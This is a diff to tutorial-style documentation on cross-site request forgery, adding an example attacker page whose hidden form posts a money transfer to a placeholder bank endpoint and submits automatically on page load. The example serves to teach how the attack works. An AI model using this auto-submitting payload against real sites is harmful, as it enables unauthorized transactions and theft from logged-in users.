@@ -101,7 +101,28 @@
    - A user logs into `www.legitbank.com` and receives a session cookie.
    - Without logging out, the user visits a malicious site: `www.attackersite.com`.
    - `www.attackersite.com` contains a form or script that makes a request to `www.legitbank.com` (e.g., to transfer money) using the user's credentials.
+Example Form:
+```jsx
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Site</title>
+    <script>
+        function submitRequest() {
+            document.getElementById("maliciousForm").submit();
+        }
+        window.onload = submitRequest; // Automatically submit the form on page load
+    </script>
+</head>
+<body>
+    <form id="maliciousForm" action="https://www.legitbank.com/transferMoney" method="POST" style="display:none;">
+        <input type="hidden" name="amount" value="1000" />
+        <input type="hidden" name="toAccount" value="attacker-account-number" />
+    </form>
+</body>
+</html>
 
+```
 3. **Automatic Cookie Transmission**:
    - When the malicious site makes a request to `www.legitbank.com`, the user's browser automatically attaches the session cookie from `www.legitbank.com`.
    - The browser does this because it recognizes the domain of the cookie (`www.legitbank.com`) and includes it in all requests to that domain.
